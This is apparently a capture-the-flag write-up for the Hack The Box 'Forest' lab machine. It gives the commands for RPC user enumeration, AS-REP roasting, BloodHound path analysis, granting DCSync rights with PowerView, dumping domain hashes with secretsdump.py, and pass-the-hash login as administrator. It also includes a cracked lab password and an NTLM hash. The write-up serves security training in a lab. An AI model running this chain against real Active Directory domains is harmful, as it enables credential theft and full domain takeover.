for port 445 SMB:
I would use `smbclient` and `smbmap` to find valid user.
```

Very sadly, we did not find anything.

I can try to check over RPC to enumerate users.
`rpcclient -U "" -N 10.10.10.161`
I can get a list of users with enumdomusers:
```
rpcclient $> enumdomusers

I can list the groups as well:
```

group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

I can also look at a group for it’s members. For example, the Domain Admins group has one member, rid 0x1f4:
```
rpcclient $> querygroup 0x200   
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```
That’s the Administrator account:
```
rpcclient $> queryuser 0x1f4            
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:

        Workstations:

```

Typically that requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts. I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts:
```
cat users
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

Now I can use the Impacket tool GetNPUsers.py to try to get a hash for each user, and I find one for the svc-alfresco account:
```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

[*] Getting TGT for svc-alfresco

```

Then we can crack it `s3rvice` and we can use `evil-winrm` to connect it.

3,shell as SYSTEM
With my shell, I’ll run SharpHound to collect data for BloodHound. I’ve got a copy of Bloodhound on my machine (you can use git clone https://github.com/BloodHoundAD/BloodHound.git if you don’t). I’ll start a Python webserver in the Ingestors directory, and then load it in to my current session:
`powershell wget http://10.10.16.5/SharpHound.exe -outfile SharpHound.exe`
Then we need to download to our local machine.

Under “Analysis”, I’ll click “Find Shorter Paths to Domain Admin”, and get the following graph:
![](images/Pasted%20image%2020240924094545.png)

There’s two jumps needed to get from my current access as svc-alfresco to Administrator, who is in the Domain Admins group.
Because my user is in Service Account, which is a member of Privileged IT Account, which is a member of Account Operators, it’s basically like my user is a member of Account Operators. And Account Operators has Generic All privilege on the Exchange Windows Permissions group. If I right click on the edge in Bloodhound, and select help, there’s an “Abuse Info” tab in the pop up that displays:
![](images/Pasted%20image%2020240924094741.png)

This gives a full background as to how to abuse this, and if I scroll down, I see an example:
`Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred`
or
`net group "Exchange Windows Permissions" svc-alfresco /add /domain`

In this place, we need to upload the `PowerView.ps1` and import it 
`Import-Module .\PowerView.ps1`

Now I’ll use the fact that members of the Exchange Windows Permissions group have WriteDacl on the domain. Again, looking at the help, it shows commands I can run:
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

Once I do that, I can run a DCSync attack, either with Mimikatz locally, or with secretsdump.py from my Kali box, since DCSync only requires access to TCP 445, TCP 135, and a TCP RPC port (49XXX).

I’ll create a one-liner to run locally. I don’t need to pass credentials to the first command, because I’m already running as a user with those rights. I did have to pass credentials to the second command. My best guess is that the session doesn’t know yet about my being in the new group from the first command, and that passing credentials refreshes that.
```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

If I run that on Forest, it returns without error:
```
*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

I can also run secretsdump.py and get hashes:
```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

```

Then we can use `evil-winrm` to shell as SYSTEM.
```
evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

```
